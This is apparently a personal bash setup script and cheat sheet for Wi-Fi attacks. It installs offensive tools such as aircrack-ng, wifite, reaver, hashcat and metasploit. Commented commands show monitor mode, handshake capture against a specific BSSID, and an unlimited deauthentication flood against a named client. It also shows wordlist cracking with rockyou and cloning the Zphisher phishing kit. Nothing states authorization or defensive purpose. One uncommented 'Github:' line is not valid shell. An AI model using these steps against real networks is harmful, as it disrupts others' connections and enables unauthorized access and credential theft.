#!/bin/bash
#Copyright (C) 2023 Augustun1000 <augustoperezriesgo@gmail.com>

#Intall packages:
sudo pacman -S wireshark-qt aircrack-ng wifite bully cowpatty hashcat hcxdumptool hcxtools john macchanger reaver metasploit
Github: Socialfish Sherlock Zphisher Sqlmap
#--------------------------Pentesting------------------------
#Sudo pacman -S wireshark-qt airocrack-ng wifite
##monitor mode:
#ifconfig
#iwconfig
#sudo airmon-ng check
#sudo airmon-ng check kill
#sudo airmon-ng start wlp2s0
#comprobe monitor mode: iwconfig

#Wifi packets

#sudo airodump-ng wlp2s0

#sudo airodump-ng -c -w Capture-Pat -d  wlp2s0
#Ej: sudo airodump-ng -c3 -w Capture-Pat -d AC:8D:34:E7:A7:90  wlp2s0

#sudo aireplay-ng --deauth 0 -a (BSSID) -c (STATION) wlp2s0
#Ej: sudo aireplay-ng --deauth 0 -a AC:8D:34:E7:A7:90 -c 30:4B:07:34:8E:4E wlp2s0

#Wifite
#sudo wifite
#change dictionary to rockyou : sudo wifite --dict /home/augustun1000/Downloads/rockyou.txt

#---------------------Password Cracking---------------------
#sudo pacman -S hashcat john
#---------------------Web Cloning-------------------------
#git clone --depth=1 https://github.com/htr-tech/zphisher.git

